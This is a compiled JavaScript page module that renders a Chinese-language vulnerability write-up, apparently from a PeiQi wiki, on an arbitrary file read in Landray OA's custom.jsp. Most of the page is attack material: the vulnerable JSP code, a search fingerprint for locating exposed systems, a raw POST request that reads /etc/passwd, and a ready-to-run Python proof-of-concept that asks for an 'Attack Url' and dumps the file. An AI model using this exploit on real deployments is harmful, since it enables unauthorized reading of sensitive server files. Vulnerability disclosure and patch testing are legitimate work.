import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},i=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>蓝凌OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Landray-OA系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>出现漏洞的文件为 custom.jsp</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;%@page import=&quot;com.landray.kmss.util.ResourceUtil&quot;%&gt;
&lt;%@page import=&quot;net.sf.json.JSONArray&quot;%&gt;
&lt;%@page import=&quot;net.sf.json.JSONObject&quot;%&gt;
&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot;%&gt;
&lt;%
 JSONObject vara =
JSONObject.fromObject(request.getParameter(&quot;var&quot;));
 JSONObject body = JSONObject.fromObject(vara.get(&quot;body&quot;));
%&gt;
&lt;c:import url=&#39;&lt;%=body.getString(&quot;file&quot;) %&gt;&#39;&gt;
 &lt;c:param name=&quot;var&quot; value=&quot;\${ param[&#39;var&#39;] }&quot;&gt;&lt;/c:param&gt;
&lt;/c:import&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>请求包为</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090128987.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号  : PeiQi文库                                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: 蓝凌OA 任意文件读取                                          \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/sys/ui/extend/varkind/custom.jsp&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token string">&#39;var={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}&#39;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;root:&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">and</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090129010.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),p=[i];function o(l,c){return s(),a("div",null,p)}const d=n(e,[["render",o],["__file","蓝凌OA custom.jsp 任意文件读取漏洞.html.vue"]]);export{d as default};
